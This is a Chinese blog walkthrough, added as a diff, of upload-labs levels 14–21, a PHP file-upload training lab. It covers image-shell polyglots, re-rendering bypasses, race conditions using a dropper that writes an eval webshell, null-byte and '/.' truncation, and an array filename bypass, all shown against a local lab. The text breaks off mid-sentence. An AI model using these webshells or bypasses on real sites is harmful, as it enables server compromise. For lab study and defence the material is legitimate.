@@ -1,0 +1,761 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>uploads-labs通关手册以及总结(15-21) | Gridea</title>
+<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="uploads-labs通关手册以及总结(15-21) | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="
+
+Less-14 getimagesize()-图片马方法二：
+
+
+good baby
+function getReailFileType($filename){
+$file = fopen($filename, &quot;rb&quo..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              uploads-labs通关手册以及总结(15-21)
+            </h2>
+            <div class="post-info">
+              <span>
+                2021-04-30
+              </span>
+              <span>
+                16 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <ul>
+<li>
+<h1 id="less-14-getimagesize-图片马方法二">Less-14 getimagesize()-图片马方法二：</h1>
+</li>
+</ul>
+<p>good baby</p>
+<pre><code>function getReailFileType($filename){
+$file = fopen($filename, &quot;rb&quot;);
+$bin = fread($file, 2); //只读2字节
+fclose($file);
+$strInfo = @unpack(&quot;C2chars&quot;, $bin);    
+$typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
+$fileType = '';    
+switch($typeCode){      
+case 255216:            
+$fileType = 'jpg';
+break;
+case 13780:            
+$fileType = 'png';
+break;        
+case 7173:            
+$fileType = 'gif';
+break;
+default:            
+$fileType = 'unknown';
+}    
+return $fileType;
+}
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+$temp_file = $_FILES['upload_file']['tmp_name'];
+$file_type = getReailFileType($temp_file);
+
+if($file_type == 'unknown'){
+$msg = &quot;文件未知，上传失败！&quot;;
+}else{
+$img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;
+if(move_uploaded_file($temp_file,$img_path)){
+$is_upload = true;
+} else {
+$msg = &quot;上传出错！&quot;;
+}
+}
+}
+</code></pre>
+<p>fopen(): 打开文件或URL，失败则返回false。</p>
+<p>fread(): 从文件指针handle读取最多length个字节。</p>
+<p>fclose(): 关闭一个打开的文件。</p>
+<p>unpack(): 从二进制字符串对数据进行解包。</p>
+<p>该代码对文件读取两个字节，并以此判断文件类型。</p>
+<pre><code>.jpg
+</code></pre>
+<p>我们可以制作图片马进行上传(用cmd命令来制作)：</p>
+<pre><code>windows:copy 1.jpg/b + 1.php/a 2.jpg
+Linux:cat 1.jpg 1.php &gt; 2.jpg
+</code></pre>
+<p>其中/b代表二进制文件binary，放在图片后面；/a代表文字文件ascii。</p>
+<p>2.jpg为生成的图片马。</p>
+<p>上传成功，但是.jpg格式无法解析php代码，所以要配合文件包含来进行攻击。题中已经给了我们包含漏洞的文件：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619787733625.png" alt="" loading="lazy"><br>
+在用蚁剑连接我们上传的图片马：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619787825118.png" alt="" loading="lazy"></p>
+<pre><code>.png
+</code></pre>
+<p>同上：emmm，上传的.png图片，上去成了.jpg一脸懵逼<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619787875943.png" alt="" loading="lazy"></p>
+<pre><code>.gif
+</code></pre>
+<p>这里尝试一下构造gif文件头绕过，上传.php文件，burp抓包修改，将文件后缀改为.gif，且构造文件头GIF87a，上传成功。</p>
+<p>还是利用文件包含，蚁剑测试：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619787898545.png" alt="" loading="lazy"></p>
+<ul>
+<li>
+<h1 id="pass-15getimagesize检测">pass-15(getimagesize检测)</h1>
+</li>
+</ul>
+<p>baby</p>
+<pre><code>function isImage($filename){
+$types = '.jpeg|.png|.gif';
+if(file_exists($filename)){
+$info = getimagesize($filename);
+$ext = image_type_to_extension($info[2]);
+if(stripos($types,$ext)&gt;=0){
+return $ext;
+}else{
+return false;
+}
+}else{
+return false;
+}
+}
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+$temp_file = $_FILES['upload_file']['tmp_name'];
+$res = isImage($temp_file);
+if(!$res){
+$msg = &quot;文件未知，上传失败！&quot;;
+}else{
+$img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).$res;
+if(move_uploaded_file($temp_file,$img_path)){
+$is_upload = true;
+} else {
+$msg = &quot;上传出错！&quot;;
+}
+}
+}
+</code></pre>
+<p>getimagesize()：getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p>
+<p>索引 0 给出的是图像宽度的像素值</p>
+<p>索引 1 给出的是图像高度的像素值</p>
+<p>索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</p>
+<p>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image>标签</p>
+<p>索引 bits 给出的是图像的每种颜色的位数，二进制格式</p>
+<p>索引 channels 给出的是图像的通道值，RGB 图像默认是 3</p>
+<p>索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image/jpeg”);</p>
+<p>image_type_to_extension(): 根据指定的图像类型返回对应后缀名。</p>
+<p>stripos(): 查找字符串首次出现的位置，不区分大小写。</p>
+<p>绕过姿势同pass14：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619788149471.png" alt="" loading="lazy"></p>
+<ul>
+<li>
+<h1 id="pass-16exif_imagetype检测">pass-16(exif_imagetype检测)</h1>
+</li>
+</ul>
+<p>yeah</p>
+<pre><code>function isImage($filename){
+//需要开启php_exif模块
+$image_type = exif_imagetype($filename);
+switch ($image_type) {
+case IMAGETYPE_GIF:
+return &quot;gif&quot;;
+break;
+case IMAGETYPE_JPEG:
+return &quot;jpg&quot;;
+break;
+case IMAGETYPE_PNG:
+return &quot;png&quot;;
+break;    
+default:
+return false;
+break;
+}
+}
+
+$is_upload = false;
+$msg = null;
+if(isset($_POST['submit'])){
+$temp_file = $_FILES['upload_file']['tmp_name'];
+$res = isImage($temp_file);
+if(!$res){
+$msg = &quot;文件未知，上传失败！&quot;;
+}else{
+$img_path = UPLOAD_PATH.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$res;
+if(move_uploaded_file($temp_file,$img_path)){
+$is_upload = true;
+} else {
+$msg = &quot;上传出错！&quot;;
+}
+}
+}
+</code></pre>
+<p>exif_imagetype(): 读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回false。返回值和getimagesize()返回的数组索引2的值时一样的。但其比getimagesize()函数更快。</p>
+<p>在开始前要先将php.ini中修改配置，将：</p>
+<pre><code>;extension=php_exif.dll
+</code></pre>
+<p>前分号去掉，重启phpstudy后进行。</p>
+<p>仍是同14关相同：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619788282015.png" alt="" loading="lazy"></p>
+<ul>
+<li>
+<h1 id="pass-17二次渲染绕过">pass-17(二次渲染绕过)</h1>
+</li>
+</ul>
+<p>good</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])){
+// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
+$filename = $_FILES['upload_file']['name'];
+$filetype = $_FILES['upload_file']['type'];
+$tmpname = $_FILES['upload_file']['tmp_name'];
+
+$target_path=UPLOAD_PATH.'/'.basename($filename);
+
+// 获得上传文件的扩展名
+$fileext= substr(strrchr($filename,&quot;.&quot;),1);
+
+//判断文件后缀与类型，合法才进行上传操作
+if(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;)){
+if(move_uploaded_file($tmpname,$target_path)){
+//使用上传的图片生成新的图片
+$im = imagecreatefromjpeg($target_path);
+
+if($im == false){
+$msg = &quot;该文件不是jpg格式的图片！&quot;;
+@unlink($target_path);
+}else{
+//给新图片指定文件名
+srand(time());
+$newfilename = strval(rand()).&quot;.jpg&quot;;
+//显示二次渲染后的图片（使用用户上传图片生成的新图片）
+$img_path = UPLOAD_PATH.'/'.$newfilename;
+imagejpeg($im,$img_path);
+@unlink($target_path);
+$is_upload = true;
+}
+} else {
+$msg = &quot;上传出错！&quot;;
+}
+
+}else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;)){
+if(move_uploaded_file($tmpname,$target_path)){
+//使用上传的图片生成新的图片
+$im = imagecreatefrompng($target_path);
+
+if($im == false){
+$msg = &quot;该文件不是png格式的图片！&quot;;
+@unlink($target_path);
+}else{
+//给新图片指定文件名
+srand(time());
+$newfilename = strval(rand()).&quot;.png&quot;;
+//显示二次渲染后的图片（使用用户上传图片生成的新图片）
+$img_path = UPLOAD_PATH.'/'.$newfilename;
+imagepng($im,$img_path);
+
+@unlink($target_path);
+$is_upload = true;               
+}
+} else {
+$msg = &quot;上传出错！&quot;;
+}
+
+}else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;)){
+if(move_uploaded_file($tmpname,$target_path)){
+//使用上传的图片生成新的图片
+$im = imagecreatefromgif($target_path);
+if($im == false){
+$msg = &quot;该文件不是gif格式的图片！&quot;;
+@unlink($target_path);
+}else{
+//给新图片指定文件名
+srand(time());
+$newfilename = strval(rand()).&quot;.gif&quot;;
+//显示二次渲染后的图片（使用用户上传图片生成的新图片）
+$img_path = UPLOAD_PATH.'/'.$newfilename;
+imagegif($im,$img_path);
+
+@unlink($target_path);
+$is_upload = true;
+}
+} else {
+$msg = &quot;上传出错！&quot;;
+}
+}else{
+$msg = &quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;
+}
+}
+</code></pre>
+<p>magecreatefromgif(): 创建一块画布，并从GIF文件或URL地址载入一副图像。</p>
+<p>imagecreatefromjpeg(): 创建一块画布，并从JPEG文件或URL地址载入一副图像。</p>
+<p>imagecreatefrompng(): 创建一块画布，并从PNG文件或URL地址载入一副图像。</p>
+<p>imagecreatefromwbmp(): 创建一块画布，并从WBMP文件或URL地址载入一副图像。</p>
+<p>imagecreatefromstring(): 创建一块画布，并从字符串中的图像流新建一副图像。</p>
+<p>GIF：<br>
+还是先上传一个图片马，成功。</p>
+<p>用蚁剑连接发现连接不上。</p>
+<p>将图片下载到本地，查看：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619788554806.png" alt="" loading="lazy"><br>
+发现我们插入的代码消失了。</p>
+<p>二次渲染会保留一些文件内容不会改变，所以我们可以观察其不变的地方，在将代码写入即可绕过。<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619788570383.png" alt="" loading="lazy"><br>
+经对比发现蓝色部分的内容没有改变，所以我们将代码写入这部分：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619788586713.png" alt="" loading="lazy"><br>
+蚁剑连接：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619788599452.png" alt="" loading="lazy"></p>
+<ul>
+<li>
+<h1 id="pass-18条件竞争">pass-18(条件竞争)</h1>
+</li>
+</ul>
+<p>goood<br>
+$is_upload = false;<br>
+$msg = null;</p>
+<pre><code>if(isset($_POST['submit'])){
+$ext_arr = array('jpg','png','gif');
+$file_name = $_FILES['upload_file']['name'];
+$temp_file = $_FILES['upload_file']['tmp_name'];
+$file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
+$upload_file = UPLOAD_PATH . '/' . $file_name;
+
+if(move_uploaded_file($temp_file, $upload_file)){
+if(in_array($file_ext,$ext_arr)){
+$img_path = UPLOAD_PATH . '/'. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+rename($upload_file, $img_path);
+$is_upload = true;
+}else{
+$msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+unlink($upload_file);
+}
+}else{
+$msg = '上传出错！';
+}
+}
+</code></pre>
+<p>rename(): 重命名文件或目录。如果成功则返回true，失败返回false。</p>
+<p>思路： 代码是先将文件保存到文件夹后，再判断文件的后缀是否合法，不合法的删除。在多线程的情况下，可能会出现文件夹中的文件还没有处理完，我们就可以访问原文件，而绕过。</p>
+<p>条件竞争：<br>
+条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
+<p>创建18.php文件：</p>
+<pre><code>&lt;?php 
+$b = fopen(&quot;shell.php&quot;,&quot;w&quot;);
+fputs($b,'&lt;?php phpinfo(); ?&gt;');
+?&gt;
+</code></pre>
+<p>也可以：</p>
+<pre><code>&lt;?php 
+$b = fopen(&quot;shell.php&quot;,&quot;w&quot;);
+fputs($b,'&lt;?php @eval($_POST[&quot;hhh&quot;]); ?&gt;');
+?&gt;
+</code></pre>
+<p>之后用蚁剑连接，道理一样。</p>
+<p>上传文件，并用burp抓包，跳转到intruder模块：</p>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1619788709253.png" alt="" loading="lazy"><br>
+到payloads模块：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619788721966.png" alt="" loading="lazy"><br>
+开始爆破。</p>
+<p>不断访问http://127.0.0.1/upload-labs-master/upload/18.php直至shell.php文件写入成功(这里就需要一直刷新，狂点)。</p>
+<p>成功后可以去文件夹看看：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619788739027.png" alt="" loading="lazy"><br>
+发现创建成功。</p>
+<p>访问：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619788753188.png" alt="" loading="lazy"><br>
+蚁剑连接：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619788770015.png" alt="" loading="lazy"></p>
+<ul>
+<li>
+<h1 id="pass-19条件竞争2">pass-19(条件竞争2)</h1>
+</li>
+</ul>
+<p>good</p>
+<pre><code>//index.php
+$is_upload = false;
+$msg = null;
+if (isset($_POST['submit']))
+{
+require_once(&quot;./myupload.php&quot;);
+$imgFileName =time();
+$u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
+$status_code = $u-&gt;upload(UPLOAD_PATH);
+switch ($status_code) {
+case 1:
+$is_upload = true;
+$img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;
+break;
+case 2:
+$msg = '文件已经被上传，但没有重命名。';
+break; 
+case -1:
+$msg = '这个文件不能上传到服务器的临时文件存储目录。';
+break; 
+case -2:
+$msg = '上传失败，上传目录不可写。';
+break; 
+case -3:
+$msg = '上传失败，无法上传该类型文件。';
+break; 
+case -4:
+$msg = '上传失败，上传的文件过大。';
+break; 
+case -5:
+$msg = '上传失败，服务器已经存在相同名称文件。';
+break; 
+case -6:
+$msg = '文件无法上传，文件不能复制到目标目录。';
+break;      
+default:
+$msg = '未知错误！';
+break;
+}
+}
+
+//myupload.php
+class MyUpload{
+......
+......
+...... 
+var $cls_arr_ext_accepted = array(
+&quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,
+&quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );
+
+......
+......
+......  
+/** upload()
+** Method to upload the file.
+** This is the only method to call outside the class.
+** @para String name of directory we upload to
+** @returns void
+**/
+function upload( $dir ){
+
+$ret = $this-&gt;isUploadedFile();
+
+if( $ret != 1 ){
+return $this-&gt;resultUpload( $ret );
+}
+
+$ret = $this-&gt;setDir( $dir );
+if( $ret != 1 ){
+return $this-&gt;resultUpload( $ret );
+}
+
+$ret = $this-&gt;checkExtension();
+if( $ret != 1 ){
+return $this-&gt;resultUpload( $ret );
+}
+
+$ret = $this-&gt;checkSize();
+if( $ret != 1 ){
+return $this-&gt;resultUpload( $ret );    
+}
+
+// if flag to check if the file exists is set to 1
+
+if( $this-&gt;cls_file_exists == 1 ){
+  
+$ret = $this-&gt;checkFileExists();
+if( $ret != 1 ){
+return $this-&gt;resultUpload( $ret );    
+}
+}
+
+// if we are here, we are ready to move the file to destination
+
+$ret = $this-&gt;move();
+if( $ret != 1 ){
+return $this-&gt;resultUpload( $ret );    
+}
+
+// check if we need to rename the file
+
+if( $this-&gt;cls_rename_file == 1 ){
+$ret = $this-&gt;renameFile();
+if( $ret != 1 ){
+return $this-&gt;resultUpload( $ret );    
+}
+}
+
+// if we are here, everything worked as planned :)
+
+return $this-&gt;resultUpload( &quot;SUCCESS&quot; );
+
+}
+......
+......
+...... 
+};
+</code></pre>
+<p>同样是条件竞争，不过由于其先将后缀名与白名单进行了对比，所以不能上传.php了，可以上传图片马，且在其被重命名之前访问它。</p>
+<p>将上一关代码插入图片制作图片马，后通过文件包含访问图片马。</p>
+<p>首先生成图片马；上传后，通过burp抓包重放；不断访问文件，直到插入成功。</p>
+<p>因为白名单上有.7z的后缀，所以我们可以将.php改为.php.7z，由于apache不能解析这个格式，所以会把该文件当成PHP格式来解析。</p>
+<ul>
+<li>
+<h1 id="pass-20">pass-20</h1>
+</li>
+</ul>
+<p>good</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if (isset($_POST['submit'])) {
+if (file_exists(UPLOAD_PATH)) {
+$deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+
+$file_name = $_POST['save_name'];
+$file_ext = pathinfo($file_name,PATHINFO_EXTENSION);
+
+if(!in_array($file_ext,$deny_ext)) {
+$temp_file = $_FILES['upload_file']['tmp_name'];
+$img_path = UPLOAD_PATH . '/' .$file_name;
+if (move_uploaded_file($temp_file, $img_path)) { 
+$is_upload = true;
+}else{
+$msg = '上传出错！';
+}
+}else{
+$msg = '禁止保存为该类型文件！';
+}
+
+} else {
+$msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
+}
+}
+</code></pre>
+<p>pathinfo():<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619789020652.png" alt="" loading="lazy"><br>
+$file_name = $_POST['save_name'];<br>
+<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>m</mi><msub><mi>g</mi><mi>p</mi></msub><mi>a</mi><mi>t</mi><mi>h</mi><mo>=</mo><mi>U</mi><mi>P</mi><mi>L</mi><mi>O</mi><mi>A</mi><msub><mi>D</mi><mi>P</mi></msub><mi>A</mi><mi>T</mi><mi>H</mi><msup><mi mathvariant="normal">.</mi><mo mathvariant="normal">′</mo></msup><msup><mi mathvariant="normal">/</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">img_path = UPLOAD_PATH . &#x27;/&#x27; .</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mord mathdefault">A</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mord"><span class="mord">.</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord">/</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">.</span></span></span></span>file_name;<br>
+文件的保存名为拼接构成，可以参数%00截断。</p>
+<p>%00截断： 用burp抓包改包：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619789054476.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619789060845.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619789069494.png" alt="" loading="lazy"><br>
+/.绕过：利用了move_uploaded_file()函数有一特性，会忽略掉文件末尾的/.。而代码中的file_name是用户可控的，所以我们可以在保存名后加上/.绕过：<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619789083390.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619789095698.png" alt="" loading="lazy"><br>
+大小写绕过：定义了黑名单，save_name参数就是我们保存的文件名称参数。这里并没有对上传的文件类型进行判断，仅仅是对保存的名称做了黑名单处理，黑名单中并没有大写形式，我们可以在保存名直接大小写绕过。<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619789116165.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1619789127756.png" alt="" loading="lazy"></p>
+<ul>
+<li>
+<h1 id="pass-21数组绕过">pass-21(数组绕过)</h1>
+</li>
+</ul>
+<p>good</p>
+<pre><code>$is_upload = false;
+$msg = null;
+if(!empty($_FILES['upload_file'])){
+//检查MIME
+$allow_type = array('image/jpeg','image/png','image/gif');
+if(!in_array($_FILES['upload_file']['type'],$allow_type)){
+$msg = &quot;禁止上传该类型文件!&quot;;
+}else{
+//检查文件名
+$file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
+if (!is_array($file)) {
+$file = explode('.', strtolower($file));
+}
+
+$ext = end($file);
+$allow_suffix = array('jpg','png','gif');
+if (!in_array($ext, $allow_suffix)) {
+$msg = &quot;禁止上传该后缀文件!&quot;;
+}else{
+$file_name = reset($file) . '.' . $file[count($file) - 1];
+$temp_file = $_FILES['upload_file']['tmp_name'];
+$img_path = UPLOAD_PATH . '/' .$file_name;
+if (move_uploaded_file($temp_file, $img_path)) {
+$msg = &quot;文件上传成功！&quot;;
+$is_upload = true;
+} else {
+$msg = &quot;文件上传失败！&quot;;
+}
+}
+}
+}else{
+$msg = &quot;请选择要上传的文件！&quot;;
+}
+</code></pre>
+<p>比20关多了MIME类检查，后判断save_name参数是否为空，为空则将上传文件名赋给<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">不</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">空</mi><mi mathvariant="normal">将</mi><mi>s</mi><mi>a</mi><mi>v</mi><msub><mi>e</mi><mi>n</mi></msub><mi>a</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">赋</mi><mi mathvariant="normal">给</mi></mrow><annotation encoding="application/x-tex">file，不为空将save_name赋给</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">将</span><span class="mord mathdefault">s</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">赋</span><span class="mord cjk_fallback">给</span></span></span></span>file。</p>
+<pre><code>if (!is_array($file)) {
+$file = explode('.', strtolower($file));
+}
+</code></pre>
+<p>判断$file是否为数组，不是则将其拆分为数组。</p>
+<p>分为数组后，将数组最后一个的值(end($file))同白名单作比较，符合则上传，上传后将数组的值拼接在一起对文件进行重命名。</p>
+<p>reset($file)取数组的第一个元素，<br>
+<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mo>[</mo><mi>c</mi><mi>o</mi><mi>u</mi><mi>n</mi><mi>t</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">file[count(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mopen">[</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">u</span><span class="mord mathdefault">n</span><span class="mord mathdefault">t</span><span class="mopen">(</span></span></span></span>file) - 1]<br>
+取数组的最后一个元素。</p>
+<p>我们可以构造数组来进行绕过：</p>
+<pre><code>save_name[0]=21.php/
+
+save_name[1]=置为空
+
+save_name[2]=jpg(一个白名单后缀)
+</code></pre>
+<p>这样我们最后拼接的文件名会为20.php/.，而move_uploaded_file()函数将会解决/.的问题，这样我们上传的文件名后缀将会变为我们想要的.php，成功解决。</p>
+<p>这里一定会有人有疑惑，我们数组的最后一个值不是为jpg吗?</p>
+<p>因为当数组元素值为空时，就不会计入数组元素个数的，所以当我们使save_name[1]为空时，实际计算的数组元素个数为2。这里的<br>
